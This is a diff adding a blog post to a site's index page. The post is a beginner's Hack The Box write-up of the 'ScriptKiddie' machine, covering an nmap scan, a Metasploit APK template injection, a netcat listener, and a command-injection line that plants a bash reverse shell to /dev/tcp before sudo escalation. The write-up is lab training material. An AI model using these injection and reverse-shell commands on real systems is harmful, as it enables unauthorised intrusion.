@@ -214,6 +214,95 @@
             
 
   
+    <article id="post-HTB-md" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+  
+  
+    <h1 itemprop="name">
+	
+	  <a class="article-title" href="/2021/05/03/HTB-md/" target="_blank">HTB.md</a>
+  
+    </h1>
+  
+
+
+  
+  
+<a href="/2021/05/03/HTB-md/" class="archive-article-date">
+        <time datetime="2021-05-03T05:45:35.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-05-03</time>
+</a>
+
+  
+  
+    
+
+  
+  </header>
+  
+  <div class="article-entry" itemprop="articleBody">
+    
+    <h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>This is my first post on the analysis of something in my research.<br>I think I should do this sooner to be able to share what I’m learning and vice versa, also want to receive your feedback on what I have encountered and how to improve it.<br>Currently I am starting to learn about HTB and have tried a fairly simple post like its name when looking at it and immediately recognize “ScriptKiddie” :).<br><img src="/images/HTB_basic/image_1.PNG"></p>
+<h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>First we will use <em>nmap</em> to have the machine to see which port the machine is using and analyze each port in the machine.</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 10.10.10.226</span><br></pre></td></tr></table></figure>
+<p><img src="/images/HTB_basic/nmap.png"><br>Here we get 2 ports. One is port=22 and port=5000(upnp).</p>
+<h6 id="What-is-upnp"><a href="#What-is-upnp" class="headerlink" title="What is upnp ?"></a>What is upnp ?</h6><p>Universal Plug and Play (UPnP) uses two ports, 5000 TCP and 1900 UDP.<br>UPnP is a set of networking protocols that allows for networked and mobile devices to seamlessly discover each others’ presence on the network and communicate.<br>Now we are going to the website.<br><img src="/images/HTB_basic/web.png"></p>
+<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>We will use metasploit to perform another pregnancy. For newbies, it is necessary to search by keyword “Template command injection msfvenom” for more details :).<br><img src="/images/HTB_basic/metasploit.png"><br>Here I will use the address tun0 to exploit the program.<br><img src="/images/HTB_basic/exploit.png"><br>Next we will give the highest permissions to file.apk and proceed to use the file in the website.<br>We will open port 4444 </p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 4444</span><br></pre></td></tr></table></figure>
+<p>We need open before using file.apk in website :).<br><img src="/images/HTB_basic/payload.png"><br>and<br><img src="/images/HTB_basic/connect_success.png"><br>In this case, we would use to push the shell in to be able to get RCE with victim.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &#39;import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br></pre></td></tr></table></figure>
+<p><img src="/images/HTB_basic/shell.png"><br>Now we will find the User’s flag to go 50/50 the way :).<br>We just comeback <em>/home</em> and  check file  <em>kid</em>.<br><img src="/images/HTB_basic/user_flag.png"><br>Now we will check the other sections, when we get the user’s flag.<br><img src="/images/HTB_basic/pwn.png"><br>Open port 1337 or whatever port you like and insert the following script into the program to reverse shell.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;  ;&#x2F;bin&#x2F;bash -c &#39;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;your IP&#x2F;your port 0&gt;&amp;1&#39; #&quot; &gt;&gt; hackers</span><br></pre></td></tr></table></figure>
+<p><img src="/images/HTB_basic/nc_port_1337.png"><br>Now checking commands, which can be useful to escalate privileges.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
+<p><img src="/images/HTB_basic/sudo_l.png"><br>Now we have the highest privilege and just find flag(root)  and you’re done. :))).<br><em>sudo msfconsole</em>, we need it as a root  :).<br><img src="/images/HTB_basic/done.png"><br>Done.</p>
+<p>This is a simple exercise, but it also learns a lot about pentesting for newbie.<br>I hope I can be of help to everyone. If there is any error, you can comment.<br>Thank you very much.</p>
+
+    
+
+    
+
+    
+
+  </div>
+  <div class="article-info article-info-index">
+    
+    
+    
+
+    
+    <p class="article-more-link">
+      <a class="article-more-a" href="/2021/05/03/HTB-md/">展开全文 >></a>
+    </p>
+    
+
+    
+    <div class="clearfix"></div>
+  </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-hello-world" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
